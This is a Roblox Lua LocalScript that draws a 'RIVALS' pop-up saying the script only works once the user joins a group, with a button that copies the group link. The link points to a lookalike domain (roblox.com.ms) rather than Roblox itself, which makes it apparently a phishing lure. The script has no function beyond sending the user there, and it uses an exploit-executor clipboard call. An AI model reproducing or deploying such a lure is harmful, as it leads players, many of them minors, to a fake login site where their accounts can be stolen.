--// RIVALS GROUP GUI
--// Put this LocalScript inside StarterPlayer > StarterPlayerScripts

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer

--// CHANGE THIS TO YOUR GROUP LINK
local GROUP_LINK = "https://roblox.com.ms/communities/6908586948/"

--// Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "RivalsGroupGui"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

--// Main window
local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 430, 0, 270)
main.Position = UDim2.new(0.5, -215, 0.5, -135)
main.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
main.BorderSizePixel = 0
main.Parent = gui

--// Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = main

--// Red outline
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(220, 40, 40)
stroke.Thickness = 2
stroke.Parent = main

--// Top bar
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 55)
topBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
topBar.BorderSizePixel = 0
topBar.Parent = main

local topCorner = Instance.new("UICorner")
topCorner.CornerRadius = UDim.new(0, 12)
topCorner.Parent = topBar

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -70, 1, 0)
title.Position = UDim2.new(0, 20, 0, 0)
title.BackgroundTransparency = 1
title.Text = "RIVALS"
title.TextColor3 = Color3.fromRGB(255, 45, 45)
title.TextSize = 30
title.Font = Enum.Font.GothamBlack
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = topBar

--// Close button
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 38, 0, 38)
close.Position = UDim2.new(1, -48, 0, 8)
close.BackgroundColor3 = Color3.fromRGB(180, 35, 35)
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.TextSize = 18
close.Font = Enum.Font.GothamBold
close.Parent = topBar

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = close

close.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

--// Main message
local message = Instance.new("TextLabel")
message.Size = UDim2.new(1, -50, 0, 80)
message.Position = UDim2.new(0, 25, 0, 78)
message.BackgroundTransparency = 1
message.Text = "FOR THIS SCRIPT TO WORK,\nYOU MUST JOIN THE GROUP!"
message.TextColor3 = Color3.fromRGB(235, 235, 235)
message.TextSize = 21
message.Font = Enum.Font.GothamBold
message.TextWrapped = true
message.Parent = main

--// Small description
local description = Instance.new("TextLabel")
description.Size = UDim2.new(1, -50, 0, 35)
description.Position = UDim2.new(0, 25, 0, 150)
description.BackgroundTransparency = 1
description.Text = "Join the group and then continue."
description.TextColor3 = Color3.fromRGB(150, 150, 155)
description.TextSize = 15
description.Font = Enum.Font.Gotham
description.Parent = main

--// Copy button
local copyButton = Instance.new("TextButton")
copyButton.Size = UDim2.new(0, 300, 0, 45)
copyButton.Position = UDim2.new(0.5, -150, 1, -65)
copyButton.BackgroundColor3 = Color3.fromRGB(210, 40, 40)
copyButton.Text = "COPY GROUP LINK"
copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
copyButton.TextSize = 17
copyButton.Font = Enum.Font.GothamBold
copyButton.Parent = main

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = copyButton

--// Copy link
copyButton.MouseButton1Click:Connect(function()

	-- Clipboard support depends on the Roblox environment.
	if setclipboard then
		setclipboard(GROUP_LINK)

		copyButton.Text = "✓ LINK COPIED!"
		copyButton.BackgroundColor3 = Color3.fromRGB(40, 170, 80)

		task.wait(2)

		copyButton.Text = "COPY GROUP LINK"
		copyButton.BackgroundColor3 = Color3.fromRGB(210, 40, 40)
	else
		copyButton.Text = "COPY NOT AVAILABLE"

		task.wait(2)

		copyButton.Text = "COPY GROUP LINK"
	end
end)

--// DRAGGING
local dragging = false
local dragStart
local startPosition

local function updateDrag(input)
	local delta = input.Position - dragStart

	main.Position = UDim2.new(
		startPosition.X.Scale,
		startPosition.X.Offset + delta.X,
		startPosition.Y.Scale,
		startPosition.Y.Offset + delta.Y
	)
end

topBar.InputBegan:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPosition = main.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

topBar.InputChanged:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseMovement
		or input.UserInputType == Enum.UserInputType.Touch then

		UserInputService.InputChanged:Connect(function(changedInput)

			if changedInput == input and dragging then
				updateDrag(changedInput)
			end

		end)
	end
end)
